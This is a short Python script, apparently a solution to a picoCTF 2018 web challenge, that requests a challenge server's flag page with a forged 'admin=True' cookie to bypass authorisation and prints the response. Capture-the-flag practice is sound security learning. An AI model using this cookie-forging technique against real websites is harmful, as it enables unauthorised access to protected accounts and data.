#!/usr/bin/python3

import requests

url = 'http://2018shell1.picoctf.com:10573/flag'
r = requests.get(url, cookies={'admin':'True'})
print(r.cookies)
print(r.url)
print(r.request.headers)
print(r.text)